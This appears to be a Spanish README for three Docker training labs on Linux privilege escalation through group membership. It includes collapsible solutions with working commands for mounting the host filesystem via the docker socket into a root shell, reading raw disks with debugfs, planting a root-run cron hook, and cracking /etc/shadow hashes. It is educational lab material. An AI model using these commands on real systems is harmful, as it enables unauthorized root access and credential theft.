# Laboratorios de Escalada de Privilegios - Abuso de Grupos en Linux

Tres laboratorios Docker de dificultad ascendente donde se practica la escalada de privilegios mediante el abuso de pertenencia a grupos especiales en Linux.

---

## Índice

- [Requisitos](#requisitos)
- [Lab 1 - Grupo Docker (Fácil)](#lab-1---grupo-docker-fácil)
- [Lab 2 - Grupos Disk + ADM (Medio)](#lab-2---grupos-disk--adm-medio)
- [Lab 3 - Cadena de Grupos: staff + shadow + ssl-cert (Difícil)](#lab-3---cadena-de-grupos-staff--shadow--ssl-cert-difícil)
- [Soluciones](#soluciones)
- [Recursos de Aprendizaje](#recursos-de-aprendizaje)

---

## Requisitos

- Docker instalado en el host
- Conocimientos básicos de Linux
- Terminal con bash

---

## Lab 1 - Grupo Docker (Fácil)

### Concepto

Un usuario pertenece al grupo `docker`. Al tener acceso al socket de Docker, puede montar el filesystem del host dentro de un contenedor y acceder a cualquier archivo como root.

### Construcción y Ejecución

```bash
cd lab1-docker-group
docker build -t privesc-lab1 .

# IMPORTANTE: Se monta el socket de Docker del host (esto simula el escenario real)
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock privesc-lab1
```

### Credenciales

| Usuario | Contraseña |
|---------|------------|
| devuser | devuser123 |

### Objetivo

Leer el archivo `/root/flag.txt`

### Superficie de Ataque

- El usuario `devuser` pertenece al grupo `docker`
- El socket de Docker del host está montado en el contenedor
- Acceso completo al cliente Docker

### Habilidades Practicadas

- Enumeración de grupos del usuario
- Abuso del grupo docker para montar volúmenes del host
- Comprensión de por qué el grupo docker equivale a root

---

## Lab 2 - Grupos Disk + ADM (Medio)

### Concepto

Un usuario pertenece a los grupos `disk` y `adm`. El grupo `adm` permite leer logs del sistema donde se encuentran pistas. El grupo `disk` permite acceso raw a dispositivos de disco, lo que posibilita leer cualquier archivo del filesystem usando herramientas como `debugfs`. El atacante debe encadenar ambos vectores.

### Construcción y Ejecución

```bash
cd lab2-disk-adm-group
docker build -t privesc-lab2 .

# Se necesita --privileged para acceso a dispositivos de disco
docker run -it --rm --privileged privesc-lab2
```

### Credenciales

| Usuario | Contraseña |
|---------|------------|
| sysop   | sysop456   |

### Objetivo

Leer el archivo `/root/flag.txt`

### Superficie de Ataque

- **Grupo adm**: Lectura de `/var/log/auth.log` → descubrir usuarios y actividad
- **Grupo disk**: Acceso raw a dispositivos de bloque → leer cualquier archivo con `debugfs`
- Script de backup con credenciales hardcodeadas en `/usr/local/bin/backup.sh`
- Usuario `backupadmin` con sudo completo

### Caminos de Resolución

1. **Camino directo (disk)**: Usar `debugfs` para leer `/root/flag.txt` directamente desde el dispositivo raw
2. **Camino encadenado (adm → disk)**: Leer logs → descubrir backupadmin → usar debugfs para leer el script de backup → obtener su contraseña → `su backupadmin` → `sudo su`

### Habilidades Practicadas

- Enumeración de permisos por grupo
- Análisis de logs del sistema
- Uso de `debugfs` para acceso raw a disco
- Identificación de credenciales en scripts
- Movimiento lateral entre usuarios

---

## Lab 3 - Cadena de Grupos: staff + shadow + ssl-cert (Difícil)

### Concepto

Un usuario pertenece a tres grupos especiales simultáneamente: `staff`, `shadow` y `ssl-cert`. Debe descubrir y encadenar múltiples vectores de ataque para escalar hasta root. El lab requiere pensamiento lateral y encadenar al menos dos técnicas distintas.

### Construcción y Ejecución

```bash
cd lab3-multi-group-chain
docker build -t privesc-lab3 .

docker run -it --rm --privileged privesc-lab3
```

### Credenciales

| Usuario | Contraseña |
|---------|------------|
| webdev  | webdev789  |

### Objetivo

Leer el archivo `/root/flag.txt`

### Superficie de Ataque

- **Grupo shadow**: Lectura de `/etc/shadow` → crackear hashes de contraseñas
- **Grupo ssl-cert**: Acceso a `/etc/ssl/private/` → encontrar clave SSH de `deployer`
- **Grupo staff**: Escritura en `/usr/local/bin/`, `/usr/local/lib/`, `/usr/local/etc/` → plantar código ejecutable
- Cron job que ejecuta `/usr/local/bin/deploy.sh` como root cada 2 minutos
- El script de deploy carga hooks desde `/usr/local/lib/deploy-hooks/`
- `deployer` tiene sudo limitado para ejecutar `deploy.sh`
- `dbadmin` tiene una contraseña débil crackeable

### Caminos de Resolución

**Camino 1 — shadow → crack → staff → cron (completo):**
1. Leer `/etc/shadow` (grupo shadow)
2. Crackear hash de `dbadmin` (password: `database1`)
3. `su dbadmin` → leer sus notas → descubrir la estructura del deploy
4. Como `webdev` (grupo staff), plantar un hook malicioso en `/usr/local/lib/deploy-hooks/`
5. Esperar 2 minutos → el cron ejecuta el hook como root

**Camino 2 — ssl-cert → SSH → sudo → deploy hook:**
1. Explorar `/etc/ssl/private/.keys/` (grupo ssl-cert)
2. Encontrar la clave SSH de `deployer`
3. Conectar por SSH como `deployer` usando la clave
4. `deployer` tiene sudo para `/usr/local/bin/deploy.sh`
5. Desde `webdev` (grupo staff), modificar `deploy.sh` o plantar un hook
6. Como `deployer`: `sudo /usr/local/bin/deploy.sh` → ejecuta el hook como root

**Camino 3 — staff directo (el más rápido si se identifica):**
1. Notar que el grupo `staff` permite escribir en `/usr/local/lib/deploy-hooks/`
2. Crear un hook malicioso: `echo 'cp /root/flag.txt /tmp/flag && chmod 644 /tmp/flag' > /usr/local/lib/deploy-hooks/pwn.sh`
3. Esperar al cron (2 minutos) o usar el camino ssl-cert para activar sudo deploy

### Habilidades Practicadas

- Enumeración exhaustiva de grupos y permisos
- Cracking de hashes con john/hashcat
- Descubrimiento de claves SSH en ubicaciones inesperadas
- Abuso de permisos de escritura del grupo staff
- Inyección de hooks en scripts de deployment
- Abuso de cron jobs y sudo
- Encadenamiento de múltiples vectores de ataque

---

## Soluciones

> **Advertencia**: Intenta resolver los labs por tu cuenta antes de ver las soluciones.

<details>
<summary>Solución Lab 1 (click para expandir)</summary>

```bash
# Verificar grupos
id
# uid=1000(devuser) gid=1000(devuser) groups=1000(devuser),999(docker)

# Montar el filesystem del host y leer la flag
docker run -v /:/hostfs -it ubuntu:22.04 cat /hostfs/root/flag.txt

# Alternativa: obtener shell root
docker run -v /:/hostfs -it ubuntu:22.04 chroot /hostfs bash
```

</details>

<details>
<summary>Solución Lab 2 (click para expandir)</summary>

```bash
# Verificar grupos
id
# uid=1000(sysop) gid=1000(sysop) groups=1000(sysop),4(adm),6(disk)

# --- CAMINO DIRECTO: grupo disk ---
# Identificar el dispositivo
df -h /
# /dev/sda1 o /dev/vda1, etc.

# Leer flag directamente con debugfs
debugfs /dev/sda1 -R "cat /root/flag.txt"

# --- CAMINO ENCADENADO: adm + disk ---
# 1. Leer logs (grupo adm)
cat /var/log/auth.log
# Descubrir que backupadmin usa sudo

# 2. Leer el script de backup via debugfs (grupo disk)
debugfs /dev/sda1 -R "cat /usr/local/bin/backup.sh"
# Encontrar: BACKUP_PASS="B4ckup_S3cur3_2024!"

# 3. Cambiar a backupadmin
su backupadmin
# Password: B4ckup_S3cur3_2024!

# 4. Escalar a root
sudo su
cat /root/flag.txt
```

</details>

<details>
<summary>Solución Lab 3 (click para expandir)</summary>

```bash
# Verificar grupos
id
# uid=1000(webdev) gid=1000(webdev) groups=1000(webdev),42(shadow),50(staff),120(ssl-cert)

# ==========================================
# CAMINO MÁS RÁPIDO: grupo staff + cron
# ==========================================

# 1. Verificar que podemos escribir en deploy-hooks
ls -la /usr/local/lib/deploy-hooks/

# 2. Plantar hook malicioso
echo '#!/bin/bash
cp /root/flag.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt' > /usr/local/lib/deploy-hooks/pwn.sh
chmod +x /usr/local/lib/deploy-hooks/pwn.sh

# 3. Esperar ~2 minutos al cron
sleep 120

# 4. Leer la flag
cat /tmp/flag.txt

# ==========================================
# CAMINO ALTERNATIVO: ssl-cert → SSH → sudo
# ==========================================

# 1. Explorar certificados
ls -laR /etc/ssl/private/
# Encontrar /etc/ssl/private/.keys/deployer_id_rsa

# 2. Copiar la clave y conectar como deployer
cp /etc/ssl/private/.keys/deployer_id_rsa /tmp/key
chmod 600 /tmp/key
ssh -i /tmp/key deployer@localhost

# 3. Como deployer, ejecutar deploy (que corre nuestro hook)
sudo /usr/local/bin/deploy.sh

# 4. Volver a webdev y leer la flag
cat /tmp/flag.txt

# ==========================================
# CAMINO CON CRACK: shadow → dbadmin
# ==========================================

# 1. Leer shadow
cat /etc/shadow
# dbadmin:$y$...:... (hash crackeable)

# 2. Crackear con john
echo 'dbadmin:$y$...' > /tmp/hash.txt
john /tmp/hash.txt --wordlist=/usr/share/john/password.lst
# password: database1

# 3. Cambiar a dbadmin y leer sus notas
su dbadmin
cat ~/docs/server-notes.txt
```

</details>

---

## Recursos de Aprendizaje

- [GTFOBins](https://gtfobins.github.io/) — Técnicas de abuso de binarios en Linux
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — Guía completa de privesc
- [Linux Groups and Permissions](https://man7.org/linux/man-pages/man5/group.5.html) — Man page de grupos
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) — Cheatsheet de privesc

---

## Disclaimer

Estos laboratorios son exclusivamente para fines educativos y de práctica en entornos controlados. No utilices estas técnicas en sistemas sin autorización explícita.